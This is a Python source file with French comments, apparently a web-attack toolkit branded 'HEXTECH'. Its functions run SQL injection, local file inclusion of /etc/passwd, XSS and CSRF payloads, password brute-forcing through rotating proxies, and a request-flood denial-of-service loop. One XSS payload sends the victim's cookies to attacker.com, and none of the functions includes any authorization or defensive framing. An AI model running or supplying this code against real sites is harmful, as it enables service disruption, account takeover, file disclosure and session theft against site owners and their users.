import requests
from itertools import product
from termcolor import colored
import random
import socket
import time

# Liste de proxies à utiliser
PROXY_LIST = ['http://proxy1', 'http://proxy2', 'http://proxy3']

def get_random_proxy():
    return random.choice(PROXY_LIST)

def detect_vulnerability(url):
    print(colored("[🦠] Analyse de vulnérabilités🦠 en cours...", "yellow"))
    payload = "' OR '1'='1"  # Exemple de payload pour test
    try:
        response = requests.get(url, params={"test": payload}, timeout=10)
        if payload in response.text:
            print(colored("[HEXTECH] Vulnérabilité détectée avec le payload!", "green"))
            return True
        else:
            print(colored("[RAPPORT HEXTECH ☣️] Aucune vulnérabilité détectée.", "red"))
            return False
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'analyse : {e}", "red"))
        return False

def get_cookies(url):
    print(colored("[*] Récupération des cookies en cours...", "yellow"))
    try:
        response = requests.get(url, timeout=10)
        cookies = response.cookies.get_dict()
        if cookies:
            print(colored(f"[+] Cookies récupérés : {cookies}", "green"))
            return cookies
        else:
            print(colored("[-] Aucun cookie trouvé.", "red"))
            return None
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de la récupération des cookies : {e}", "red"))
        return None

def lfi_test(url, file_path="/etc/passwd"):
    print(colored("[*] Test LFI en cours...", "yellow"))
    try:
        response = requests.get(url, params={"file": file_path}, timeout=10)
        if response.status_code == 200 and "root:" in response.text:
            print(colored(f"[+] Inclusion réussie avec le fichier : {file_path}", "green"))
            return response.text[:500]  # Limiter l'affichage
        else:
            print(colored("[-] Inclusion échouée.", "red"))
            return None
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors du test LFI : {e}", "red"))
        return None

def ddos_attack(target, max_requests=1000):
    print(colored("[*] Lancement de l'attaque DDoS...", "yellow"))
    try:
        for _ in range(max_requests):
            response = requests.get(target, timeout=5)
            print(f"Sending request to {target}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))

def ddos_attack_with_proxies(target, max_requests=1000):
    print(colored("[*] Lancement de l'attaque DDoS avec proxies...", "yellow"))
    try:
        for _ in range(max_requests):
            proxy = get_random_proxy()
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(target, proxies=proxies, timeout=5)
            print(f"Sending request to {target} via proxy {proxy}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'attaque DDoS avec proxies : {e}", "red"))

def bruteforce_attack_with_proxies(url, username="admin", chars="abc123", max_length=4):
    print(colored("[ATTENTION ⚠️] Lancement de l'attaque par bruteforce avec proxy...", "yellow"))
    for length in range(1, max_length + 1):
        for attempt in product(chars, repeat=length):
            password = ''.join(attempt)
            data = {"username": username, "password": password}
            proxy = get_random_proxy()
            proxies = {"http": proxy, "https": proxy}
            try:
                response = requests.post(url, data=data, proxies=proxies, timeout=10)
                if "Welcome" in response.text:  # Modifier selon la réponse attendue
                    print(colored(f"[+] Mot de passe trouvé : {password}", "green"))
                    return password
                else:
                    print(colored(f"[-] Tentative échouée : {password}", "red"))
            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Erreur lors de la tentative avec {password} : {e}", "red"))
    print(colored("[-] Bruteforce terminé sans succès.", "red"))
    return None

def advanced_sql_injection_test(url):
    print(colored("[*] Lancement du test d'injection SQL avancée...", "yellow"))
    payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL, NULL --", 
        "' AND 1=2 --", 
        "' OR 'x'='x' --"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'search': payload}, timeout=10)
            if "Welcome" in response.text:
                print(f"[+] Injection réussie avec le payload: {payload}")
            else:
                print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors de l'injection SQL : {e}", "red"))

def xss_attack(url):
    print(colored("[*] Lancement de l'attaque XSS (Cross-Site Scripting)...", "yellow"))
    payloads = [
        "<script>alert('XSS')</script>", 
        "<img src='x' onerror='alert(1)'>", 
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={"input": payload}, timeout=10)
            if payload in response.text:
                print(colored(f"[+] Vulnérabilité XSS détectée avec le payload : {payload}", "green"))
            else:
                print(colored(f"[-] Le payload {payload} ne fonctionne pas.", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors de l'attaque XSS : {e}", "red"))

def csrf_attack(url, post_data=None):
    print(colored("[*] Lancement de l'attaque CSRF...", "yellow"))
    if post_data is None:
        post_data = {"target": "http://malicious-attack.com"}  # Payload CSRF simulé
    try:
        response = requests.post(url, data=post_data, timeout=10)
        if "Success" in response.text:  # Ajustez cette condition selon le site
            print(colored("[+] CSRF attaque réussie!", "green"))
        else:
            print(colored("[-] L'attaque CSRF a échoué.", "red"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Erreur lors de l'attaque CSRF : {e}", "red"))

# Ajouter la fonctionnalité de fuzzing
def fuzzing_attack(url):
    print(colored("[*] Lancement de l'attaque de fuzzing...", "yellow"))
    fuzz_data = [
        "' OR 1=1 --", 
        "<script>alert('XSS')</script>", 
        "../etc/passwd", 
        "admin' OR 1=1 --"
    ]
    for data in fuzz_data:
        try:
            response = requests.get(url, params={"input": data}, timeout=10)
            print(f"Test de fuzzing avec : {data} - Statut : {response.status_code}")
            if response.status_code == 200:
                print(colored(f"[+] Fuzzing réussi avec : {data}", "green"))
            else:
                print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Erreur lors du fuzzing : {e}", "red"))
